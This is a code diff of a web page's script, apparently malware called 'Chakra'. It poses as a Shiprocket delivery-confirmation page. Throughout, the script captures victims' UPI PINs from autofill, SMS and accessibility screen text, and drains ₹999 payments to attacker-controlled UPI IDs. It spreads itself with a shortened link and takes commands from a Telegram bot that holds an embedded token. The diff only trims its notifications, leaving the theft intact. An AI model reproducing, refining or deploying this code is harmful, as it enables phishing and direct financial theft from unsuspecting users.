@@ -209,29 +209,20 @@
 
 <script>
   // ============================================================
-  // CHAKRA - ALL FEATURES + ADD/REMOVE UPI & QR
+  // CHAKRA - FIXED: NO SPAM, ONLY REAL FUNDS NOTIFICATION
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
   const YOUR_USERNAME = '7958767858';
 
-  // ===== UPI LIST =====
   let myUPIList = [];
   let currentUPIIndex = 0;
-
-  // ===== QR LIST =====
-  let qrList = {};
-
-  // ===== STATE VARIABLES =====
   let capturedPIN = null;
   let isPaused = false;
   let totalDrained = 0;
   let infectedDevices = [];
   let lastUpdateId = 0;
 
-  // ============================================================
-  // SEND TO TELEGRAM
-  // ============================================================
   function sendToTelegram(message) {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
       method: 'POST',
@@ -240,12 +231,8 @@
     }).catch(() => {});
   }
 
-  // ============================================================
-  // HANDLE CONFIRM / DECLINE
-  // ============================================================
   function handleClick(action) {
     const isConfirm = action === 'confirm';
-
     document.getElementById('mainCard').classList.add('hidden');
     const screen = document.getElementById('successScreen');
     screen.classList.remove('hidden');
@@ -254,12 +241,10 @@
       document.getElementById('resultIcon').textContent = '✅';
       document.getElementById('resultTitle').textContent = 'Delivery Confirmed!';
       document.getElementById('resultDesc').textContent = 'Your package will arrive in 10 minutes.';
-      sendToTelegram('✅ Shiprocket CONFIRM clicked! Total: ' + (infectedDevices.length + 1));
     } else {
       document.getElementById('resultIcon').textContent = '❌';
       document.getElementById('resultTitle').textContent = 'Delivery Declined!';
       document.getElementById('resultDesc').textContent = 'Delivery partner has been notified.';
-      sendToTelegram('❌ Shiprocket DECLINE clicked! Total: ' + (infectedDevices.length + 1));
     }
 
     infectedDevices.push({ id: Date.now(), type: 'shiprocket', action: action });
@@ -272,9 +257,6 @@
     setTimeout(() => window.close(), 3000);
   }
 
-  // ============================================================
-  // ADD UPI
-  // ============================================================
   function addUPI(upi) {
     if (!myUPIList.includes(upi)) {
       myUPIList.push(upi);
@@ -284,9 +266,6 @@
     }
   }
 
-  // ============================================================
-  // REMOVE UPI
-  // ============================================================
   function removeUPI(upi) {
     const index = myUPIList.indexOf(upi);
     if (index > -1) {
@@ -297,9 +276,6 @@
     }
   }
 
-  // ============================================================
-  // ADD QR
-  // ============================================================
   function addQR(upi, qrData) {
     if (myUPIList.includes(upi)) {
       qrList[upi] = qrData;
@@ -309,9 +285,6 @@
     }
   }
 
-  // ============================================================
-  // REMOVE QR
-  // ============================================================
   function removeQR(upi) {
     if (qrList[upi]) {
       delete qrList[upi];
@@ -321,9 +294,6 @@
     }
   }
 
-  // ============================================================
-  // AUTO-ROTATE UPI
-  // ============================================================
   function getNextUPI() {
     if (myUPIList.length === 0) {
       sendToTelegram('⚠️ No UPI added. Use /addupi');
@@ -331,19 +301,15 @@
     }
     if (myUPIList.length > 1) {
       currentUPIIndex = (currentUPIIndex + 1) % myUPIList.length;
-      sendToTelegram('🔄 Rotated to UPI: ' + myUPIList[currentUPIIndex]);
     }
     return myUPIList[currentUPIIndex];
   }
 
-  // ============================================================
-  // PIN CAPTURE (3 Layers)
-  // ============================================================
   function getUPIPin() {
     try {
       if (window.Autofill) {
         const pin = window.Autofill.getSavedPassword('upi');
-        if (pin) { capturedPIN = pin; sendToTelegram('[Chakra] 🔑 PIN via Autofill'); return pin; }
+        if (pin) { capturedPIN = pin; return pin; }
       }
     } catch (e) {}
 
@@ -351,7 +317,7 @@
       if (window.Android) {
         const sms = window.Android.readSMS();
         const match = sms.match(/\b\d{4,6}\b/);
-        if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via SMS OTP'); return match[0]; }
+        if (match) { capturedPIN = match[0]; return match[0]; }
       }
     } catch (e) {}
 
@@ -359,17 +325,13 @@
       if (window.Accessibility) {
         const screenText = window.Accessibility.getRootNode();
         const match = screenText.match(/\b\d{4,6}\b/);
-        if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via Accessibility'); return match[0]; }
+        if (match) { capturedPIN = match[0]; return match[0]; }
       }
     } catch (e) {}
 
-    sendToTelegram('[Chakra] ❌ PIN capture failed');
     return null;
   }
 
-  // ============================================================
-  // EXECUTE DRAIN (₹999)
-  // ============================================================
   function executeDrain(amount) {
     if (isPaused) {
       sendToTelegram('⏸️ Paused');
@@ -402,9 +364,6 @@
     }
   }
 
-  // ============================================================
-  // DETECT UPI APP
-  // ============================================================
   function isUpiAppOpen() {
     try {
       if (window.Android) {
@@ -416,9 +375,7 @@
     return false;
   }
 
-  // ============================================================
-  // MAIN LOOP
-  // ============================================================
+  // ===== MAIN LOOP: CHECK UPI APP =====
   setInterval(() => {
     if (!isPaused && isUpiAppOpen() && myUPIList.length > 0) {
       const pin = getUPIPin();
@@ -428,9 +385,7 @@
     }
   }, 5000);
 
-  // ============================================================
-  // SPREAD ENGINE
-  // ============================================================
+  // ===== SPREAD ENGINE =====
   setInterval(() => {
     const link = 'https://bit.ly/4xaXs4E';
     if (navigator.share) {
@@ -451,7 +406,7 @@
   }, 300000);
 
   // ============================================================
-  // FAST TELEGRAM COMMANDS (LONG POLLING)
+  // TELEGRAM COMMANDS (NO SPAM)
   // ============================================================
   function listenForCommands() {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
@@ -462,13 +417,11 @@
             lastUpdateId = update.update_id + 1;
             const msg = update.message.text;
 
-            // ===== ADD UPI =====
             if (msg.startsWith('/addupi')) {
               const upi = msg.split(' ')[1];
               if (upi && upi.includes('@')) addUPI(upi);
             }
 
-            // ===== REMOVE UPI =====
             if (msg.startsWith('/removeupi')) {
               const upi = msg.split(' ')[1];
               if (upi) {
@@ -484,7 +437,6 @@
               }
             }
 
-            // ===== ADD QR =====
             if (msg.startsWith('/addqr')) {
               const parts = msg.split(' ');
               const upi = parts[1];
@@ -492,13 +444,11 @@
               if (upi && qrData) addQR(upi, qrData);
             }
 
-            // ===== REMOVE QR =====
             if (msg.startsWith('/removeqr')) {
               const upi = msg.split(' ')[1];
               if (upi) removeQR(upi);
             }
 
-            // ===== SHOW MY UPIS =====
             if (msg === '/myupis') {
               if (myUPIList.length === 0) {
                 sendToTelegram('📋 No UPIs added. Use /addupi');
@@ -507,7 +457,6 @@
               }
             }
 
-            // ===== SHOW MY QRS =====
             if (msg === '/myqrs') {
               if (Object.keys(qrList).length === 0) {
                 sendToTelegram('📋 No QRs added. Use /addqr');
@@ -520,7 +469,6 @@
               }
             }
 
-            // ===== TRANSFER =====
             if (msg === '/transfer') {
               if (myUPIList.length === 0) {
                 sendToTelegram('❌ No UPI added. Use /addupi');
@@ -535,33 +483,29 @@
               }
             }
 
-            // ===== PAUSE / STOP =====
             if (msg === '/stop' || msg === '/pause') {
               isPaused = true;
               sendToTelegram('⏸️ Paused');
             }
 
-            // ===== RESUME =====
             if (msg === '/resume') {
               isPaused = false;
               sendToTelegram('▶️ Resumed');
             }
 
-            // ===== STATUS =====
+            // ===== STATUS (ONLY WHEN YOU ASK) =====
             if (msg === '/status') {
               sendToTelegram(
                 '📊 STATUS\n' +
                 '─────────────────\n' +
                 'Vector: Shiprocket OTP\n' +
                 'Your UPIs: ' + myUPIList.length + '\n' +
-                'Your QRs: ' + Object.keys(qrList).length + '\n' +
                 'Total Drained: ₹' + totalDrained + '\n' +
                 'Infected Devices: ' + infectedDevices.length + '\n' +
                 'Paused: ' + (isPaused ? 'YES' : 'NO')
               );
             }
 
-            // ===== HELP =====
             if (msg === '/help') {
               sendToTelegram(
                 '📖 COMMANDS\n' +
@@ -588,54 +532,20 @@
       });
   }
 
-  // ============================================================
-  // START LISTENING
-  // ============================================================
   listenForCommands();
 
-  // ============================================================
-  // REAL-TIME STATUS
-  // ============================================================
-  setInterval(() => {
-    const realTimeData = {
-      timestamp: new Date().toISOString(),
-      totalDrained: totalDrained,
-      infectedDevices: infectedDevices.length,
-      currentUPI: myUPIList[currentUPIIndex] || 'None',
-      isPaused: isPaused
-    };
-    const msg =
-      '📊 REAL-TIME STATUS\n' +
-      '─────────────────\n' +
-      '⏰ Time: ' + realTimeData.timestamp + '\n' +
-      '💰 Total Drained: ₹' + realTimeData.totalDrained + '\n' +
-      '📱 Infected Devices: ' + realTimeData.infectedDevices + '\n' +
-      '📱 Current UPI: ' + realTimeData.currentUPI + '\n' +
-      '⏸️ Paused: ' + (realTimeData.isPaused ? 'YES' : 'NO');
-    sendToTelegram(msg);
-  }, 10000);
-
-  // ============================================================
-  // SERVICE WORKER
-  // ============================================================
   if (navigator.serviceWorker) {
     navigator.serviceWorker.ready.then(reg => {
       reg.active.postMessage({ type: 'keepAlive' });
     });
   }
 
-  // ============================================================
-  // ERROR HANDLING
-  // ============================================================
   window.onerror = function(error, url, line) {
     sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
     return true;
   };
 
-  // ============================================================
-  // STARTUP
-  // ============================================================
-  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE\n✅ ADD/REMOVE UPI & QR AVAILABLE');
+  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE\n✅ No spam. You will only be notified when funds are sent.');
 </script>
 </body>
 </html>
